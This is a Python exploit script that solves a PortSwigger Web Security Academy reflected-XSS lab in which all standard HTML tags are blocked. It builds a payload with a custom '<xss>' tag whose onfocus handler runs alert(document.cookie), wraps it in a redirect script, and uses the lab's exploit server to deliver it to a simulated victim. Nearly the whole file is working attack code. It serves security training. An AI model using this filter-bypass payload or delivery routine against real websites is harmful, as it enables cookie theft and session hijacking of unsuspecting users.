#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit Script: Reflected XSS into HTML context with all tags blocked except custom ones

This script targets a PortSwigger Web Security Academy lab scenario where all HTML tags
except custom ones are blocked. The goal is to insert a custom tag (e.g., <xss>) that
triggers an alert(document.cookie).

Steps:
  1. Input LAB_URL, EXPLOIT_SERVER_URL, and BURP_PROXY via user input.
  2. Generate a payload with a custom tag triggering document.cookie alert.
  3. Send the payload to the exploit server through Burp Proxy if specified.
"""

import requests
from colorama import init, Fore, Style
import urllib3
from urllib.parse import quote

# Initialize colorama (for colored terminal output)
init(autoreset=True)

# Disable SSL warnings for Burp Proxy interception
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_user_inputs():
    """
    ユーザーに URL とプロキシ情報を入力させる関数
    """
    lab_url = input(f"{Fore.CYAN}Enter the LAB URL (e.g., https://YOUR-LAB-ID.web-security-academy.net): {Style.RESET_ALL}").strip()
    exploit_server_url = input(f"{Fore.CYAN}Enter the Exploit Server URL (e.g., https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net): {Style.RESET_ALL}").strip()

    use_proxy = input(f"{Fore.MAGENTA}Do you want to use a Burp Proxy? (y/n): {Style.RESET_ALL}").strip().lower()
    if use_proxy == 'y':
        proxy_host = input(f"{Fore.CYAN}Enter proxy host (default: 127.0.0.1): {Style.RESET_ALL}").strip() or "127.0.0.1"
        proxy_port = input(f"{Fore.CYAN}Enter proxy port (default: 8080): {Style.RESET_ALL}").strip() or "8080"
        proxy_url = f"http://{proxy_host}:{proxy_port}"
        burp_proxy = {"http": proxy_url, "https": proxy_url}
        print(f"{Fore.GREEN}[+] Proxy set to: {proxy_url}{Style.RESET_ALL}")
    else:
        burp_proxy = None
        print(f"{Fore.YELLOW}[!] No proxy will be used.{Style.RESET_ALL}")

    return lab_url, exploit_server_url, burp_proxy


def build_xss_payload(lab_url: str) -> str:
    """
    Generate the XSS payload with a custom <xss> tag that triggers alert(document.cookie).
    """
    # XSS ペイロード（URLエンコード前）
    custom_tag = "<xss id=x onfocus=alert(document.cookie) tabindex=1>"

    # クエリパラメータとして渡すためURLエンコード
    encoded_tag = quote(custom_tag)

    # HTML ペイロード生成
    payload = f"""
<script>
location = '{lab_url}/?search={encoded_tag}#x';
</script>
""".strip()
    return payload


def deliver_exploit(exploit_server_url: str, payload: str, burp_proxy=None) -> requests.Response:
    """
    Deliver the generated payload to the exploit server via a POST request.
    Optionally pass the request through a Burp proxy if specified.
    """
    # Custom HTTP response headers
    response_head = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=utf-8"
    )

    # Prepare POST request data
    data = {
        "responseBody": payload,
        "responseHead": response_head,
        "formAction": "DELIVER_TO_VICTIM",
        "urlIsHttps": "on",
        "responseFile": "/exploit"
    }

    # Send request with optional proxy
    return requests.post(
        exploit_server_url,
        data=data,
        proxies=burp_proxy,
        verify=False  # Disables SSL verification due to Burp's self-signed certificate
    )


def main():
    print(f"{Fore.CYAN}=== Reflected XSS Exploit Script ==={Style.RESET_ALL}")

    # Step 1: Get user inputs
    lab_url, exploit_server_url, burp_proxy = get_user_inputs()

    # Step 2: Generate XSS payload
    payload = build_xss_payload(lab_url)

    # Step 3: Deliver the payload to the exploit server
    print(f"{Fore.YELLOW}[*] Delivering exploit to the victim via exploit server...", end="")

    try:
        response = deliver_exploit(exploit_server_url, payload, burp_proxy)
        if response.status_code == 200:
            print(f"{Fore.GREEN} OK{Style.RESET_ALL}")
            print(f"{Fore.WHITE}[+] The exploit has been successfully delivered!")
        else:
            print(f"{Fore.RED} FAILED{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Status Code: {response.status_code}")
            print(f"{Fore.RED}[-] Response Body: {response.text}")
            return

    except requests.RequestException as e:
        print(f"{Fore.RED} FAILED{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] An error occurred while sending the request:")
        print(f"{Fore.RED}{e}")
        return

    # Step 4: Confirm success
    print(f"{Fore.GREEN}[✓] If the victim visits the malicious link, alert(document.cookie) should be triggered.")
    print(f"{Fore.GREEN}[✓] The lab should now be marked as solved.")


if __name__ == "__main__":
    main()
